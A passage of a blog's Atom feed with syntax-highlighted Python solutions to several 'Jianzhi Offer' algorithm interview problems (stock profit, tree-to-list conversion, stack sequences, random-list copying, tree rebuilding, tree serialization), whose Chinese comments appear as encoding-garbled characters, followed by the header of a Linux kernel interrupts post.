class="string">        """</span></span><br><span class="line">        max_num=<span class="number">0</span> <span class="comment">#è®°å½•å½“å‰è‚¡ç¥¨æœ€å¤§å·®å€¼</span></span><br><span class="line">        <span class="keyword">if</span> len(prices)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        min_num=prices[<span class="number">0</span>] <span class="comment">#å°†ç¬¬ä¸€å¤©çš„è‚¡ç¥¨ä½œä¸ºæœ€å°çš„å€¼</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(prices)):</span><br><span class="line">            min_num = min(min_num,prices[i<span class="number">-1</span>]) <span class="comment">#åˆ¤æ–­å½“å¤©å’Œå½“å‰æœ€å°å€¼ä¸­çš„æœ€å°å€¼</span></span><br><span class="line">            <span class="keyword">if</span> prices[i]-min_num&gt;max_num: <span class="comment">#å¦‚æœå½“å¤©çš„è‚¡ç¥¨å‡å»ä¹‹å‰çš„è‚¡ç¥¨æœ€å°å€¼å¤§äºæœ€å¤§å·®å€¼</span></span><br><span class="line">                max_num = prices[i]-min_num <span class="comment">#åˆ™æ›¿æ¢æœ€å¤§å·®å€¼</span></span><br><span class="line">        <span class="keyword">return</span> max_num</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-36-äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨-medium"><a href="#å‰‘æŒ‡-Offer-36-äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨-medium" class="headerlink" title="å‰‘æŒ‡ Offer 36. äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨(medium)"></a>å‰‘æŒ‡ Offer 36. äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node(object):</span></span><br><span class="line"><span class="string">    def __init__(self, val, left=None, right=None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    head = <span class="literal">None</span></span><br><span class="line">    tail = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeToDoublyList</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: Node</span></span><br><span class="line"><span class="string">        :rtype: Node</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        self.pre(root) <span class="comment">#ä¸­åºéå†</span></span><br><span class="line">        self.head.left = self.tail <span class="comment">#å¤´èŠ‚ç‚¹å‰é©±æŒ‡å‘å°¾èŠ‚ç‚¹</span></span><br><span class="line">        self.tail.right = self.head <span class="comment">#å°¾èŠ‚ç‚¹åé©±æŒ‡å‘å¤´èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">return</span> self.head</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">(self,root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.pre(root.left)</span><br><span class="line">        <span class="keyword">if</span>(self.head == <span class="literal">None</span>):</span><br><span class="line">            self.head = self.tail = root</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.tail.right = root</span><br><span class="line">            root.left = self.tail</span><br><span class="line">            self.tail = root</span><br><span class="line">        self.pre(root.right)</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-31-æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—-medium"><a href="#å‰‘æŒ‡-Offer-31-æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—-medium" class="headerlink" title="å‰‘æŒ‡ Offer 31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—(medium)"></a>å‰‘æŒ‡ Offer 31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validateStackSequences</span><span class="params">(self, pushed, popped)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type pushed: List[int]</span></span><br><span class="line"><span class="string">        :type popped: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        s = [] <span class="comment">#åˆå§‹åŒ–ä¸€ä¸ªæ ˆ</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> popped:</span><br><span class="line">            <span class="comment">#å¾—åˆ°æ¯ä¸€ä¸ªpopå‡ºå»çš„æ•°å­—åœ¨pushæ•°ç»„ä¸­çš„ä¸‹æ ‡</span></span><br><span class="line">            <span class="comment">#åŠ ä¸€ä¸ºäº†æ–¹ä¾¿åç»­å¯¹sæ ˆè¿›è¡Œæ’å…¥æ“ä½œï¼Œå³è¿™é‡Œres-1æ‰æ˜¯çœŸæ­£çš„ä¸‹æ ‡</span></span><br><span class="line">            res = pushed.index(i)+<span class="number">1</span></span><br><span class="line">            <span class="comment">#å¦‚æœå½“å‰popå‡ºå»çš„æ•°åœ¨pushæ•°ç»„çš„ä¸‹æ ‡å¤§äºsæ ˆçš„é•¿åº¦</span></span><br><span class="line">            <span class="comment">#åˆ™éœ€è¦å°†ä¸‹æ ‡æ•°å­—ä¹‹å‰çš„æ•°å­—éƒ½å†™å…¥sæ ˆä¸­</span></span><br><span class="line">            <span class="keyword">if</span> res &gt; len(s):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(len(s),res):</span><br><span class="line">                    s.append(k)</span><br><span class="line">                <span class="comment">#è¿™ä¸€æ­¥å¯¹popå‡ºå»çš„ä¸‹æ ‡ç½®ä¸º-1</span></span><br><span class="line">                s[res<span class="number">-1</span>] = <span class="number">-1</span></span><br><span class="line">            <span class="comment">#å¦‚æœå½“å‰popå‡ºå»çš„æ•°åœ¨pushæ•°ç»„çš„ä¸‹æ ‡å°äºsæ ˆçš„é•¿åº¦</span></span><br><span class="line">            <span class="comment">#åˆ™æˆ‘ä»¬åªéœ€è¦åˆ¤æ–­åœ¨sæ ˆä¸­å¯¹äºresä¸‹æ ‡ä¹‹åçš„æ•°å€¼æ˜¯å¦ä¸º-1å³å¯</span></span><br><span class="line">            <span class="keyword">elif</span> res &lt; len(s):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(res,len(s)):</span><br><span class="line">                    <span class="comment">#å¦‚æœåœ¨resä¸‹æ ‡ä¹‹åå­˜åœ¨ä¸ä¸º-1çš„ä¸‹æ ‡ï¼Œåˆ™ç›´æ¥è¿”å›false</span></span><br><span class="line">                    <span class="keyword">if</span> s[j] != <span class="number">-1</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">                <span class="comment">#å¦‚æœresä¸‹æ ‡ä¹‹åå­˜åœ¨sæ ˆä¸­çš„éƒ½æ˜¯-1</span></span><br><span class="line">                <span class="comment">#åˆ™å¯¹å½“å‰ä¸‹æ ‡è¿›è¡Œç½®ä¸º-1æ“ä½œ</span></span><br><span class="line">                s[res<span class="number">-1</span>] = <span class="number">-1</span></span><br><span class="line">        <span class="comment">#å¾ªç¯ç»“æŸçš„è¯è¿”å›True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-35-å¤æ‚é“¾è¡¨çš„å¤åˆ¶-medium"><a href="#å‰‘æŒ‡-Offer-35-å¤æ‚é“¾è¡¨çš„å¤åˆ¶-medium" class="headerlink" title="å‰‘æŒ‡ Offer 35. å¤æ‚é“¾è¡¨çš„å¤åˆ¶(medium)"></a>å‰‘æŒ‡ Offer 35. å¤æ‚é“¾è¡¨çš„å¤åˆ¶(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, x, next=None, random=None):</span></span><br><span class="line"><span class="string">        self.val = int(x)</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">        self.random = random</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">copyRandomList</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: Node</span></span><br><span class="line"><span class="string">        :rtype: Node</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        node = head <span class="comment">#ä¿ç•™å¤´èŠ‚ç‚¹ä¸æ”¹å˜</span></span><br><span class="line">        <span class="keyword">while</span>(node): <span class="comment">#å…ˆç”¨å­—å…¸å•ç‹¬å¤åˆ¶æ¯ä¸€ä¸ªèŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">            d[node] = Node(node.val)</span><br><span class="line">            node = node.next</span><br><span class="line">        node = head <span class="comment">#ä¿ç•™å¤´èŠ‚ç‚¹ä¸æ”¹å˜</span></span><br><span class="line">        <span class="keyword">while</span>(node): <span class="comment">#é“¾æ¥æ¯ä¸€ä¸ªå•èŠ‚ç‚¹</span></span><br><span class="line">            d[node].next = d.get(node.next)</span><br><span class="line">            d[node].random = d.get(node.random)</span><br><span class="line">            node = node.next</span><br><span class="line">        <span class="keyword">return</span> d[head]</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-07-é‡å»ºäºŒå‰æ ‘-medium"><a href="#å‰‘æŒ‡-Offer-07-é‡å»ºäºŒå‰æ ‘-medium" class="headerlink" title="å‰‘æŒ‡ Offer 07. é‡å»ºäºŒå‰æ ‘(medium)"></a>å‰‘æŒ‡ Offer 07. é‡å»ºäºŒå‰æ ‘(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildTree</span><span class="params">(self, preorder, inorder)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type preorder: List[int]</span></span><br><span class="line"><span class="string">        :type inorder: List[int]</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> preorder:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(preorder[<span class="number">0</span>]) <span class="comment">#å°†å‰åºéå†ç¬¬ä¸€ä¸ªå€¼ä½œä¸ºæ ¹èŠ‚ç‚¹</span></span><br><span class="line">        index = inorder.index(preorder[<span class="number">0</span>]) <span class="comment">#æ‰¾åˆ°æ ¹èŠ‚ç‚¹å†ä¸­åºéå†ä¸­çš„ä½ç½®</span></span><br><span class="line">        root.left = self.buildTree(preorder[<span class="number">1</span>:<span class="number">1</span>+index],inorder[:index]) <span class="comment">#é€’å½’æ„å»ºå·¦å­æ ‘</span></span><br><span class="line">        root.right = self.buildTree(preorder[<span class="number">1</span>+index:],inorder[index+<span class="number">1</span>:]) <span class="comment">#é€’å½’æ„å»ºå³å­æ ‘</span></span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-45-æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°-medium"><a href="#å‰‘æŒ‡-Offer-45-æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°-medium" class="headerlink" title="å‰‘æŒ‡ Offer 45. æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°(medium)"></a>å‰‘æŒ‡ Offer 45. æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minNumber</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        æ€è·¯åˆ†æ</span></span><br><span class="line"><span class="string">        ä¾æ¬¡æ¯”è¾ƒnumsä¸­çš„æ•°å­—ï¼Œå°†å°½å¯èƒ½ç»„åˆèµ·æ¥å°çš„æ•°æ”¾åœ¨resæ•°ç»„çš„å‰é¢</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#å…ˆå‡†å¤‡ä¸€ä¸ªç©ºçš„æ•°ç»„ï¼Œç”¨æ¥å­˜æ•°ç»„</span></span><br><span class="line">        res = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="comment">#å¦‚æœresä¸ºç©ºï¼Œé‚£ä¹ˆç›´æ¥æ·»åŠ å½“å‰æ•°</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">                res.append(i)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#å¦‚æœresä¸ä¸ºç©ºï¼Œåˆ™ä»numsçš„å½“å‰æ•°ä¸resä¸­çš„æ¯ä¸€ä¸ªæ•°ç»„åˆèµ·æ¥è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="string">"""</span></span><br><span class="line"><span class="string">                åˆ†åˆ«å°†å½“å‰æ•°å­—å’Œresä¸­çš„æ¯ä¸€ä¸ªæ•°å­—ç»„åˆè¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line"><span class="string">                ä¾‹å¦‚numså½“å‰æ•°æ˜¯30ï¼Œresä¸­çš„å½“å‰æ•°æ˜¯3</span></span><br><span class="line"><span class="string">                æˆ‘ä»¬ä¼šå¾—åˆ°ä¸¤ä¸ªç»„åˆï¼Œåˆ†åˆ«æ˜¯303å’Œ330</span></span><br><span class="line"><span class="string">                å°†è¿™ä¸¤ä¸ªæ•°è¿›è¡Œæ¯”è¾ƒï¼Œå‘ç°303ä¼šå°ä¸€äº›ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†3æ”¾åœ¨30åé¢</span></span><br><span class="line"><span class="string">                åœ¨resæ•°ç»„ä¸­è¡¨ç°ä¸ºç»§ç»­å‘åæ¯”è¾ƒ</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">                s1 = str(res[j]) + str(i)</span><br><span class="line">                s2 = str(i) + str(res[j])</span><br><span class="line">                <span class="keyword">if</span> int(s1) &lt; int(s2):</span><br><span class="line">                    <span class="keyword">continue</span> <span class="comment">#ç»§ç»­å‘åæ¯”è¾ƒ</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment">#å¦‚æœnumsä¸­çš„æ•°æ”¾åœ¨res[j]ä¹‹å‰ä¼šä½¿å¾—å€¼æ›´å°ä¸€äº›</span></span><br><span class="line">                    <span class="comment">#é‚£ä¹ˆæˆ‘ä»¬å°±æŠŠnumsä¸­çš„å½“å‰æ•°æ’å…¥åˆ°res[j]ä¹‹å‰è¿™ä¸ªä½ç½®</span></span><br><span class="line">                    res[j:j] = [i]</span><br><span class="line">                    <span class="comment">#flag=1è¯´æ˜å·²ç»numsä¸­çš„å€¼å·²ç»æ’å…¥åˆ°resä¸­äº†ï¼Œä¸éœ€è¦å†æ¯”è¾ƒäº†</span></span><br><span class="line">                    <span class="comment">#ç›´æ¥é€€å‡ºreså¾ªç¯</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#å¦‚æœflag=0è¯´æ˜reså·²ç»éå†ç»“æŸ</span></span><br><span class="line">            <span class="comment">#è¿™ä¸ªæ—¶å€™åªéœ€è¦å°†numså½“å‰å€¼æ’å…¥åˆ°resåé¢å³å¯</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(i)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">            s += str(i)</span><br><span class="line">        <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-37-åºåˆ—åŒ–äºŒå‰æ ‘-hard"><a href="#å‰‘æŒ‡-Offer-37-åºåˆ—åŒ–äºŒå‰æ ‘-hard" class="headerlink" title="å‰‘æŒ‡ Offer 37. åºåˆ—åŒ–äºŒå‰æ ‘(hard)"></a>å‰‘æŒ‡ Offer 37. åºåˆ—åŒ–äºŒå‰æ ‘(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Codec</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.strTree=[]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""Encodes a tree to a single string.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            self.strTree.append(<span class="string">"null"</span>)</span><br><span class="line">            <span class="keyword">return</span> self.strTree</span><br><span class="line">        curStr = str(root.val)</span><br><span class="line">        self.strTree.append(curStr)</span><br><span class="line">        self.serialize(root.left)</span><br><span class="line">        self.serialize(root.right)</span><br><span class="line">        <span class="keyword">return</span> self.strTree</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="string">"""Decodes your encoded data to tree.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type data: str</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">1</span> <span class="keyword">and</span> data[<span class="number">0</span>] == <span class="string">"null"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        Tval = data.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> Tval == <span class="string">"null"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(Tval)</span><br><span class="line">        root.left = self.deserialize(data)</span><br><span class="line">        root.right = self.deserialize(data)</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Codec object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># codec = Codec()</span></span><br><span class="line"><span class="comment"># codec.deserialize(codec.serialize(root))</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰‘æŒ‡-Offer-43-1ï½n-æ•´æ•°ä¸­-1-å‡ºç°çš„æ¬¡æ•°-hard&quot;&gt;&lt;a href=&quot;#å‰‘æŒ‡-Offer-43-1ï½n-æ•´æ•°ä¸­-1-å‡ºç°çš„æ¬¡æ•°-hard&quot; class=&quot;headerlink&quot; title=&quot;å‰‘æŒ‡ Offer 43. 1ï½n æ•´æ•°ä¸­ 1 å‡ºç°çš„æ¬¡æ•°
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>æ·±å…¥ç†è§£linuxå†…æ ¸ä¹‹ä¸­æ–­å’Œå¼‚å¸¸</title>
    <link href="elssm.github.io/2021/11/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3linux%E5%86%85%E6%A0%B8%E4%B9%8B%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8/"/>
    <id>elssm.github.io/2021/11/23/æ·±å…¥ç†è§£linuxå†…æ ¸ä¹‹ä¸­æ–­å’Œå¼‚å¸¸/</id>
    <published>2021-11-23T13:51:39.000Z</published>
    <updated>2021-12-13T09:53:03.099Z</updated>
    
